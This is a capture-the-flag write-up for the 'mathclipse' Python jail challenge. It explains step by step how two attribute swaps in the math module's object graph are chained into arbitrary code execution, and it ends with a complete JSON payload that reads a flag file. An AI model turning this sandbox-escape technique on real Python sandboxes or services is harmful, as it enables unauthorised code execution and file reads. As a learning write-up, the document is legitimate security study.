# mathclipse

A JSON payload lets you swap two pairs of values inside `math`'s attribute graph. The swaps run directly on the object graph before any output comes back, the task is to chain them into arbitrary code execution and read the flag.

## Attachment

- [mathclipse-7c2aa0c80e529aa3.tar.gz](attachments/mathclipse-7c2aa0c80e529aa3.tar.gz) 
```python
import json
import math

def one(step):
    if type(step) is not list or len(step) != 1 or type(step[0]) not in (str, int):
        raise ValueError("bad step")
    return step[0]

def slot(path):
    obj = math
    for step in path[:-1]:
        obj = getattr(obj, step) if type(step) is str else obj[one(step)]
    key = one(path[-1])
    return obj, key, obj[key]

pairs = json.loads(input("> "))

assert len(pairs) == 2 and all(
    len(pair) == 2 and all(1 <= len(path) <= 6 for path in pair)
    for pair in pairs
) and sum(len(path) for pair in pairs for path in pair) <= 19

resolved = [(slot(a), slot(b)) for a, b in pairs]

for (x, i, u), (y, j, v) in resolved:
    x[i], y[j] = v, u
```

## stage 1 — finding the vuln

I checked `math.__loader__` locally first and it was a boring `BuiltinImporter`, nothing on it. So I built the challenge's own `python:3.14-slim` image to test against instead, and there `math` is a compiled extension — `math.__loader__` is an `ExtensionFileLoader`, and its `create_module` is a real Python function from frozen importlib:

```json
["__loader__", "create_module", "__globals__", ["sys"]]
["__loader__", "create_module", "__builtins__", ["exec"]]
```

## stage 2 — I built a forced-crash primitive

I noticed both writes in a pair run left to right. So if the first write lands and the second targets a tuple (immutable), my first mutation survives before Python throws:

```json
["__loader__", "create_module", "__code__", "co_consts", [0]]
```

## stage 3 — dead ends I ran into

This is where most of the time actually went — I kept digging into side paths that looked promising and weren't.

I tried `open = print` first, hoping to leak something during the crash — it printed `"/app/server.py" "rb"`, the wrong file.

I found `license._Printer__filenames` next, writable in 6 steps, and tried to trigger it through `sys.excepthook`:

```
Error in sys.excepthook:
TypeError: _Printer.__call__() takes 1 positional argument but 4 were given
```

`excepthook` always calls with 3 args; `license()` wants 0. Dead on arrival. I ran the same idea against `unraisablehook`, `breakpointhook`, `displayhook`, `__import__`, and `_imp._fix_co_filename` — none of them fire on the forced tuple crash.

I spent a while poisoning `sys.path`, `sys.meta_path`, `SOURCE_SUFFIXES`, and `FileFinder` cache entries too — all reachable, none of it made `traceback`'s import touch `/app/flag.txt`. I also tried `os.environ`, but nothing outcomes.

Closest I got was class subscription:

```python
list["/app/flag.txt"]   # types.GenericAlias, not a str
```

Every type I tried gave back a `GenericAlias` instead of a plain string, and `open(ga)`, `os.fspath(ga)` both reject it.

## stage 4 — the breakthrough

`math.__dict__.__class__["ANY STRING"].__args__[0]` unwraps a `GenericAlias` back into a plain string, in 5 steps:

```json
["__dict__", "__class__", ["ANY STRING"], "__args__", [0]]
```

`__args__` is also a tuple — reusing it as the crash target lets me write an arbitrary string *and* trigger the forced exception in one slot.

## stage 5 — weaponizing it

`FileFinder.path_hook()` calls `_path_isdir(path)` on a fresh `sys.path[0]` during the post-crash `traceback` import. So I swapped:

1. `_path_isdir` → builtin `exec`
2. `sys.path[0]` → Python source code

I found the hook itself buried in `_frozen_importlib_external`:

```python
def path_hook_for_FileFinder(path):
    if not _path_isdir(path):
        raise ImportError('only directories are supported', path=path)
    return cls(path, *loader_details)
```

The reason this fires at all is that a freshly-swapped-in string is never already sitting in `sys.path_importer_cache`, so when `traceback`'s import walks `sys.path` looking for a finder, Python calls this hook fresh instead of reusing a cached one.

## stage 6 — final payload

```json
[
  [
    ["__loader__", "create_module", "__globals__", ["_path_isdir"]],
    ["__loader__", "create_module", "__builtins__", ["exec"]]
  ],
  [
    ["__loader__", "create_module", "__globals__", ["sys"], "path", [0]],
    ["__dict__", "__class__", ["print(open('/app/flag.txt').read())"], "__args__", [0]]
  ]
]
```

Lengths: 4 + 4 + 6 + 5 = **19**, right at the cap.

```
_path_isdir   <- exec
builtins.exec <- original _path_isdir

sys.path[0]               <- "print(open('/app/flag.txt').read())"
GenericAlias.__args__[0]  <- old sys.path[0]   # tuple TypeError, right on cue
```

Both swaps in the first pair have to land clean — if either targets a tuple, I lose the `exec`/`_path_isdir` swap entirely, then the GenericAlias write fails on purpose.

## stage 7 — retrieving the flag

By connecting to `nc mathclipse.chal.hitconctf.com 16767` and running [`solver.py`](solver.py), I got:

```
$ python solver.py
hitcon{When_math3nmatics_m33ts_the_darkness@Where_th3_l0g1c_go3s_dark!}

Traceback (most recent call last):
TypeError: 'tuple' object does not support item assignment
```

That tuple error is proof `sys.path[0]` already ran.

## flag 
```
hitcon{When_math3nmatics_m33ts_the_darkness@Where_th3_l0g1c_go3s_dark!}`
```
